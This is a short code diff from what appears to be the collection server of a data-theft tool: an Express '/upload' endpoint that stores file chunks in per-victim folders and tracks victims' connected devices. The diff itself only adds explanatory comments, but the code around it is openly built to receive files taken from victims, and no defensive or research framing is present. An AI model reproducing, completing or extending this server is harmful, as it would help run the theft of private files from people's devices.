@@ -49,7 +49,7 @@ if (!fs.existsSync(OUTPUT_BASE_DIR)) {
 
 const victimFolders = {};
 const victimFileCounts = {};
-const victimTotalFiles = {};
+const victimTotalFiles = {}; // Keeps track of total file count (total chunks)
 const victimFiles = {};
 const connectedDevices = {};
 
@@ -121,7 +121,7 @@ app.post('/upload', (req, res) => {
       victimFolders[victimId] = path.join(OUTPUT_BASE_DIR, `${victimId}_${timestamp}`);
       fs.mkdirSync(victimFolders[victimId], { recursive: true });
       victimFileCounts[victimId] = 0;
-      victimTotalFiles[victimId] = totalChunks;
+      victimTotalFiles[victimId] = totalChunks; // Set totalChunks here for the specific victim
     }
 
     const victimFolder = victimFolders[victimId];
